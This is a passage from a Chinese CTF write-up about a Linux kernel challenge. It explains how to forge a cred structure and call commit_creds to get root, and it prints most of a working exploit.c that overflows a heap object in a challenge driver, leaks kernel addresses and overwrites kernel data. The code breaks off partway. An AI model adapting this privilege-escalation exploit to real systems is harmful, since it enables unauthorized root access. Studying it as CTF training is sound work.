<p><a href="https://kagehutatsu.com/?p=696" target="_blank" rel="noopener noreffer">影二つ的博客</a>：通过 <code>init_task</code> 结构体，遍历全部的 <code>task_struct</code>，找到当前进程的 <code>cred</code> ，清零 PID 便能拿到 root 权限。无需跳回用户态。</p>
</li>
<li>
<p>当然，找到当前 <code>task_struct</code> 之后，也可以直接把 <code>cred</code> 结构体指针改成 <code>init_cred</code>。</p>
</li>
</ul>
<p>笔者一开始复现时采用了第一种方法，因为它看上去是最自然的。<code>init_cred</code> 有这些结构，一般来说它被赋予的值见<a href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/linux-privilege-escalation.html#process-credentials" target="_blank" rel="noopener noreffer">这篇文章</a>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
</span><span class="cm"> * The initial credentials for the initial task
</span><span class="cm"> */</span>
<span class="k">struct</span> <span class="n">cred</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">usage</span>                  <span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span>
<span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS
</span><span class="cp"></span>        <span class="p">.</span><span class="n">subscribers</span>            <span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
        <span class="p">.</span><span class="n">magic</span>                  <span class="o">=</span> <span class="n">CRED_MAGIC</span><span class="p">,</span>
<span class="cp">#endif
</span><span class="cp"></span>        <span class="p">.</span><span class="n">uid</span>                    <span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">gid</span>                    <span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">suid</span>                   <span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">sgid</span>                   <span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">euid</span>                   <span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">egid</span>                   <span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">fsuid</span>                  <span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">fsgid</span>                  <span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">securebits</span>             <span class="o">=</span> <span class="n">SECUREBITS_DEFAULT</span><span class="p">,</span>
        <span class="p">.</span><span class="n">cap_inheritable</span>        <span class="o">=</span> <span class="n">CAP_EMPTY_SET</span><span class="p">,</span>
        <span class="p">.</span><span class="n">cap_permitted</span>          <span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
        <span class="p">.</span><span class="n">cap_effective</span>          <span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
        <span class="p">.</span><span class="n">cap_bset</span>               <span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
        <span class="p">.</span><span class="n">user</span>                   <span class="o">=</span> <span class="n">INIT_USER</span><span class="p">,</span>
        <span class="p">.</span><span class="n">user_ns</span>                <span class="o">=</span> <span class="o">&amp;</span><span class="n">init_user_ns</span><span class="p">,</span>
        <span class="p">.</span><span class="n">group_info</span>             <span class="o">=</span> <span class="o">&amp;</span><span class="n">init_groups</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>看上去只要 <code>.usage = 4</code>，其他的全 0 就完事了。但实际上并不是。经过测试在 <code>ptr[15]</code> 处需要填充一处可读写的地址（填 SLUB 地址就行），这样就可以成功执行 <code>commit_creds</code> 拿到 root 权限。Nu1L 题解这样就行，但是我复现的时候发现后续 <code>open(&quot;/flag&quot;)</code> 再次 syscall read 的时候会出现段错误，错误现场能推测出是 <code>cred</code> 结构体伪造有误。最后经过反复尝试发现 <code>ptr[17]</code> 处需要和 <code>init_cred</code> 该处的值保持一致，这个值在 kernel 的某个数据段，和 kernel 代码段偏移貌似是有概率不变的。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>
    <span class="c1">// ptr[16] = 0xffffffff8284ef80;
</span><span class="c1"></span>    <span class="c1">// ptr[17] = 0xffffffff8284f020;
</span><span class="c1"></span>    <span class="n">ptr</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0xffffffff8109bcf0</span> <span class="o">+</span> <span class="mh">0xffffffff8284f020</span><span class="p">;</span>
    <span class="c1">// ptr[18] = 0xffffffff82850e20;
</span><span class="c1"></span>    <span class="c1">// ptr[19] = 0xffffffff82850610;
</span></code></pre></td></tr></table>
</div>
</div><p>认为这个地址和代码段偏移不变的话，最终写出如下 exploit.c，实测是有很大概率可以打通的。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">struct</span> <span class="n">AddParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">type</span><span class="p">;</span> <span class="c1">// type and enc
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>   
<span class="p">};</span>

<span class="k">struct</span> <span class="n">OtherParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>     
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">Add</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">AddParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Add return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B64</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>    
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Launch return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6B</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Update</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Update return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B67</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Dump</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Dump return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B69</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>    
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Detach</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6D</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/dev/kkk&#34;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">sendbuf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">recvbuf</span><span class="p">[</span><span class="mh">0x10000</span><span class="p">];</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Current UID: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] open wrong, exit&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">struct</span> <span class="n">AddParam</span> <span class="n">a</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">OtherParam</span> <span class="n">r</span><span class="p">;</span>

    <span class="c1">// malloc 1024 - 48 = 0x3D0
</span><span class="c1"></span>
    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x7a</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x16</span><span class="p">;</span>  <span class="c1">// overflow 2 bits of the key size
</span><span class="c1"></span>    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>


    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>  <span class="c1">// trigger overflow
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">r</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">sendbuf</span><span class="p">;</span>
    <span class="n">r</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">recvbuf</span><span class="p">;</span>
    <span class="n">Dump</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>   <span class="c1">// chunk 1 OOB read, read chunk 2
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">slub_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">);</span>  <span class="c1">// 0xffff888005318b70
</span><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">kkk_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">);</span>   <span class="c1">// 0xffffffffc0000130
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">kkk_fops</span> <span class="o">=</span> <span class="mh">0xffffffffc0001180ul</span> <span class="o">+</span> <span class="n">kkk_addr</span> <span class="o">-</span> <span class="mh">0xffffffffc0000130ul</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] slub_addr: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">slub_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] kkk_addr: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kkk_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] kkk_fops: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kkk_fops</span><span class="p">);</span>


    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>   <span class="c1">// key_len
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">)</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>   <span class="c1">// key_buf
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x50</span><span class="p">;</span>   <span class="c1">// data_len
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">)</span> <span class="o">=</span> <span class="n">kkk_fops</span><span class="p">;</span>   <span class="c1">// data_buf    
</span><span class="c1"></span>    <span class="n">Update</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>  <span class="c1">// chunk 1 OOB write, write chunk 2 
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>   
    <span class="n">Dump</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span> <span class="c1">// dump chunk 2 to leak kkk_fops
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">kernel_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">sendbuf</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">);</span> <span class="c1">// 0xffffffff812258e0
</span><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">kernel_addr</span> <span class="o">-</span> <span class="mh">0xffffffff812258e0</span> <span class="o">+</span> <span class="mh">0xffffffff8109bcf0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] kernel_addr: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kernel_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] commit_creds: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>

    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">recvbuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">);</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>
    <span class="c1">// ptr[16] = 0xffffffff8284ef80;
</span><span class="c1"></span>    <span class="c1">// ptr[17] = 0xffffffff8284f020;
</span><span class="c1"></span>    <span class="n">ptr</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0xffffffff8109bcf0</span> <span class="o">+</span> <span class="mh">0xffffffff8284f020</span><span class="p">;</span>
    <span class="c1">// ptr[18] = 0xffffffff82850e20;
</span><span class="c1"></span>    <span class="c1">// ptr[19] = 0xffffffff82850610;
